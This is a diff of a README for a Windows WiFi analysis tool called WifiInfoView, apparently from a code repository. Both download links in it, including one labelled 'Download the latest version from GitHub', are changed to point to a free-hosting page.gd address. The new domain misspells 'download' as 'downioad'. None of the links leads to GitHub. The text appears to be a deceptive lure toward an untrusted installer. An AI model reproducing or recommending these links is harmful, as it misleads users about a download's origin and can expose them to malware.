@@ -2,7 +2,7 @@
 
 WifiInfoView is a powerful and user-friendly application crafted for Windows desktop environments, enabling users to scan, analyze, and manage WiFi networks with precision. This tool is designed to provide deep insights into wireless connections, helping users optimize their network setup and troubleshoot issues effectively. Whether you are a home user or an IT professional, WifiInfoView offers a robust set of features to enhance your WiFi experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -69,6 +69,6 @@ If you encounter any issues or have suggestions for improvement, feel free to re
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 WifiInfoView is provided as a free utility for personal and educational use. Last updated: 2026. For the latest updates and news, visit the official repository.
